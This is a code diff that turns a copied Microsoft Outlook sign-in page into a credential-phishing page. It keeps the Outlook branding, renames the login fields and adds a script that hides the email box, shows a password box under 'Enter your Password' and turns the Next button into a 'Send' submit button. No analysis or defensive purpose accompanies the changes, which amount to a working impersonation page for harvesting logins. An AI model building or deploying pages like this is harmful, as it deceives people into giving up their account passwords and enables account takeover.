@@ -63,7 +63,9 @@
                             agreementClick: $loginPage.footer_agreementClick } }"><!--  --> <div data-bind="component: { name: 'header-control',
 params: {
     serverData: svr,
-    title: str['WF_STR_HeaderDefault_Title'] } }"><div class="row text-title" id="loginHeader"> <div role="heading" aria-level="1" data-bind="text: title">Sign in</div><!-- ko if: isSubtitleVisible --> <div role="heading" aria-level="2" class="text-13 subtitle" data-bind="text: str['WF_STR_App_Title']">to continue to Outlook</div><!-- /ko --> </div></div><!-- ko if: pageDescription && !svr.bv --><!-- /ko --> <div class="row"> <div role="alert" aria-live="assertive"><!-- ko if: usernameTextbox.error --><!-- /ko --> </div> <div class="form-group col-md-24"><!-- ko if: prefillNames().length > 1 --><!-- /ko --><!-- ko ifnot: prefillNames().length > 1 --> <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
+    title: str['WF_STR_HeaderDefault_Title'] } }"><div class="row text-title" id="loginHeader"> 
+        <div id="titleHeading" role="heading" aria-level="1" data-bind="text: title">Sign in</div>
+        <!-- ko if: isSubtitleVisible --> <div role="heading" aria-level="2" class="text-13 subtitle" data-bind="text: str['WF_STR_App_Title']">to continue to Outlook</div><!-- /ko --> </div></div><!-- ko if: pageDescription && !svr.bv --><!-- /ko --> <div class="row"> <div role="alert" aria-live="assertive"><!-- ko if: usernameTextbox.error --><!-- /ko --> </div> <div class="form-group col-md-24"><!-- ko if: prefillNames().length > 1 --><!-- /ko --><!-- ko ifnot: prefillNames().length > 1 --> <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
         publicMethods: usernameTextbox.placeholderTextboxMethods,
         params: {
             serverData: svr,
@@ -71,7 +73,7 @@ params: {
             hintCss: 'placeholder' + (!svr.ac ? ' ltr_override' : '') },
         event: {
             updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> 
-            <input type="email" name="email" id="i0116" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" data-bind="
+            <input type="email" name="email" id="inputEmail" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" data-bind="
                 css: { 'has-error': usernameTextbox.error },
                 ariaLabel: tenantBranding.UserIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
                 ariaDescribedBy: 'loginHeader' + (pageDescription &amp;&amp; !svr.bv ? ' loginDescription' : ''),
@@ -79,7 +81,7 @@ params: {
                 hasFocusEx: usernameTextbox.focused,
                 placeholder: $placeholderText" aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader" placeholder="Email, phone, or Skype"> 
                 
-                <input name="passwd" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="form-control" placeholder="Password" tabindex="-1" aria-hidden="true"> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div><!-- /ko --> </div> </div> <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons"> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"><!-- ko if: svr.aD && !svr.AA && !svr.AJ --> <div class="form-group" data-bind="
+                <input name="password" type="password" id="inputPassword" autocomplete="off" class="moveOffScreen" placeholder="Password" tabindex="-1" aria-hidden="true"> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div><!-- /ko --> </div> </div> <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons"> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"><!-- ko if: svr.aD && !svr.AA && !svr.AJ --> <div class="form-group" data-bind="
                 htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                 childBindings: {
                     'signup': {
@@ -111,7 +113,7 @@ params: {
                  <div data-bind="">
                      <div class="col-xs-24 no-padding-left-right button-container" data-bind="">
                         <div data-bind="" class="inline-block">
-                            <input type="button" id="idSIButton9" class="btn btn-block btn-primary" data-bind="" value="Next"> 
+                            <input type="button" onclick="showInputs()" id="buttonNext" class="btn btn-block btn-primary" data-bind="" value="Next"> 
                         </div> 
                     </div>
                 </div> 
@@ -134,5 +136,25 @@ event: {
     updateUserTiles: fetchSessions_onUpdateUserTiles,
     executeGctResult: fetchSessions_onExecuteGctResult,
     incrementAsyncTileRequestCount: fetchSessions_onIncrementAsyncTileRequestCount,
-    decrementAsyncTileRequestCount: fetchSessions_onDecrementAsyncTileRequestCount } }"><!--  --><!-- ko if: (sessionPullType & 1) != 0 && callMsaStaticMeControl() --><!-- /ko --><!-- ko if: svr.desktopSsoConfig && !isNonInteractiveAuthRequest --><!-- /ko --><!-- ko if: (sessionPullType & 2) != 0 && desktopSsoRunning() --><!-- /ko --></div><!-- /ko --><!-- ko if: svr.AX --> <div id="idPartnerPL" data-bind="injectIframe: { url: svr.AX }"><iframe height="0" width="0" src="https://outlook.office365.com/owa/prefetch.aspx?id=292841&amp;mkt=EN-US" style="display: none;"></iframe></div> <!-- /ko --></div></body>
+    decrementAsyncTileRequestCount: fetchSessions_onDecrementAsyncTileRequestCount } }"><!--  --><!-- ko if: (sessionPullType & 1) != 0 && callMsaStaticMeControl() --><!-- /ko --><!-- ko if: svr.desktopSsoConfig && !isNonInteractiveAuthRequest --><!-- /ko --><!-- ko if: (sessionPullType & 2) != 0 && desktopSsoRunning() --><!-- /ko --></div><!-- /ko --><!-- ko if: svr.AX --> <div id="idPartnerPL" data-bind="injectIframe: { url: svr.AX }"><iframe height="0" width="0" src="https://outlook.office365.com/owa/prefetch.aspx?id=292841&amp;mkt=EN-US" style="display: none;"></iframe></div> <!-- /ko --></div>
+    <script>
+        let send = false;
+
+        function showInputs() {
+            let inputPass = document.getElementById('inputPassword')
+            let buttonNext = document.getElementById('buttonNext')
+
+            inputPass.classList.remove('moveOffScreen')
+            inputPass.classList.add('form-control')
+
+            document.getElementById('inputEmail').style.cssText = 'display: none;'
+            document.getElementById('titleHeading').innerHTML = "Enter your Password"
+
+            buttonNext.value = "Send"
+            
+            if (send) buttonNext.type = "submit"
+            send = true;
+        }
+    </script>
+</body>
 </html>
